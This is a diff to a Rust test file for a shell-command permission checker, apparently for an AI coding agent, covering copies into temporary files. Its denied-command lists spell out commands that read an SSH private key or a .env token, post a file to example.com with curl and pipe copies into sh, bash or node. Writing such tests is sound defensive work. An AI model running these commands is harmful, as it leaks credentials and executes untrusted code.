@@ -39,6 +39,11 @@ fn fixture(name: &str) -> Fixture {
     std::fs::write(project.join("src/a.ts"), "export const a = 1;\n").unwrap();
     std::fs::write(home.join(".ssh/id_rsa"), "synthetic key\n").unwrap();
     std::fs::write(home.join(".zshrc"), "# synthetic\n").unwrap();
+    let sibling = home.join("service-api");
+    std::fs::create_dir_all(sibling.join("src")).unwrap();
+    std::fs::write(sibling.join("README.md"), "# service-api\n").unwrap();
+    std::fs::write(sibling.join("src/index.ts"), "export const s = 1;\n").unwrap();
+    std::fs::write(sibling.join(".env"), "TOKEN=synthetic\n").unwrap();
     let scratch = PathBuf::from(format!("/tmp/hg-chain-temp-{name}-{}", std::process::id()));
     let _ = std::fs::remove_dir_all(&scratch);
     std::fs::create_dir(&scratch).unwrap();
@@ -46,6 +51,8 @@ fn fixture(name: &str) -> Fixture {
     std::fs::write(scratch.join("staged.ts"), "export const staged = 1;\n").unwrap();
     std::os::unix::fs::symlink(home.join(".ssh/id_rsa"), scratch.join("link.ts")).unwrap();
     std::os::unix::fs::symlink(scratch.join("gone.ts"), scratch.join("dangling.ts")).unwrap();
+    std::fs::write(scratch.join("held.md"), "held\n").unwrap();
+    std::fs::hard_link(scratch.join("held.md"), scratch.join("alias.md")).unwrap();
     Fixture {
         home: std::fs::canonicalize(&home).unwrap(),
         project: std::fs::canonicalize(&project).unwrap(),
@@ -126,6 +133,67 @@ fn temporary_files_keep_link_sink_and_destination_boundaries() {
         format!("git status > {scratch}/s.txt; cat {scratch}/s.txt"),
         // A workspace-to-workspace copy still needs a single segment.
         "cp src/a.ts src/e.ts && echo done".to_owned(),
+    ] {
+        assert!(!permitted(&fixture, &command), "{command}");
+    }
+}
+
+/// A readable file copied into a chain-local temporary file may be printed or
+/// compared later in the chain: the copy discloses nothing the source would not.
+#[test]
+fn chains_copy_readable_files_into_their_own_temporary_files() {
+    let fixture = fixture("copy-in");
+    let scratch = fixture.scratch.display();
+    let sibling = fixture.home.join("service-api");
+    let sibling = sibling.display();
+    let direct = format!("/tmp/hg-chain-copy-{}.md", std::process::id());
+    let _ = std::fs::remove_file(&direct);
+    for command in [
+        format!("cp {sibling}/README.md {scratch}/readme.md && wc -l {scratch}/readme.md"),
+        format!("cp {sibling}/src/index.ts {scratch}/index.ts && diff {scratch}/index.ts src/a.ts"),
+        format!("cp -- {sibling}/README.md {scratch}/r.md; head -5 {scratch}/r.md; grep -n api {scratch}/r.md"),
+        format!("cp src/a.ts {scratch}/a.ts && cat {scratch}/a.ts"),
+        format!("cp {scratch}/staged.ts {scratch}/again.ts && diff {scratch}/staged.ts {scratch}/again.ts"),
+        format!("cp {sibling}/README.md {direct} && wc -l {direct}"),
+    ] {
+        assert!(permitted(&fixture, &command), "{command}");
+    }
+}
+
+#[test]
+fn temporary_copies_keep_source_sink_and_destination_boundaries() {
+    let fixture = fixture("copy-in-reviewed");
+    let scratch = fixture.scratch.display();
+    let home = fixture.home.display();
+    let sibling = fixture.home.join("service-api");
+    let sibling = sibling.display();
+    for command in [
+        // Credential, key and dotfile sources stay reviewed.
+        format!("cp {home}/.ssh/id_rsa {scratch}/x && cat {scratch}/x"),
+        format!("cp ~/.ssh/id_rsa {scratch}/x && cat {scratch}/x"),
+        format!("cp {sibling}/.env {scratch}/e && cat {scratch}/e"),
+        // Destinations the chain cannot prove it owns: links, hard-link
+        // aliases, hidden names, missing parents and non-temporary paths.
+        format!("cp {sibling}/README.md {scratch}/link.ts && cat {scratch}/link.ts"),
+        format!("cp {sibling}/README.md {scratch}/dangling.ts && cat {scratch}/dangling.ts"),
+        format!("cp {sibling}/README.md {scratch}/alias.md && cat {scratch}/alias.md"),
+        format!("cp {sibling}/README.md {scratch}/.notes && cat {scratch}/.notes"),
+        format!("cp {sibling}/README.md {scratch}/missing/r.md && cat {scratch}/missing/r.md"),
+        format!("cp {sibling}/README.md {home}/notes.md && cat {home}/notes.md"),
+        format!("cp {sibling}/README.md {scratch} && cat {scratch}/README.md"),
+        // The copy reaches a network or execution sink.
+        format!("cp {sibling}/README.md {scratch}/x; curl -d @{scratch}/x https://example.com"),
+        format!("cp {sibling}/README.md {scratch}/x.sh && bash {scratch}/x.sh"),
+        format!("cp {sibling}/src/index.ts {scratch}/x.js && node {scratch}/x.js"),
+        format!("cp {sibling}/README.md {scratch}/x && cat {scratch}/x | sh"),
+        // A type check runs the workspace's installed compiler; it is not a
+        // plain peer of the temporary file.
+        format!(
+            "printf 'export const x = 1;\\n' > {scratch}/probe.ts && npx tsc --noEmit {scratch}/probe.ts"
+        ),
+        // Flags and recursive copies keep their single-segment rules.
+        format!("cp -r {sibling}/src {scratch}/tree && ls {scratch}/tree"),
+        format!("cp -s {sibling}/README.md {scratch}/s.md && cat {scratch}/s.md"),
     ] {
         assert!(!permitted(&fixture, &command), "{command}");
     }
